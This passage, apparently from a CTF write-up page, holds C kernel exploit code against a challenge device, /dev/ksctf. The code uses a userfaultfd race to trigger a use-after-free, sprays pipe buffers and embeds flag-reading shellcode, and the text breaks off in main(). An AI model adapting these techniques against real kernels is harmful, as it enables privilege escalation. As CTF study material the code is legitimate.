class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SECONDARY_PIPE_COUNT 0x150</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"><span class="type">int</span> snd_pipe_fd[MAX_SECONDARY_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s\n&quot;</span>, __PRETTY_FUNCTION__);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SECONDARY_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger uaf\n&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line">        </span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        spray_pipes(<span class="number">0</span>, MAX_PIPE_COUNT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">            <span class="type">uint32_t</span> k = i;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> tmp[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0xe180</span>;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    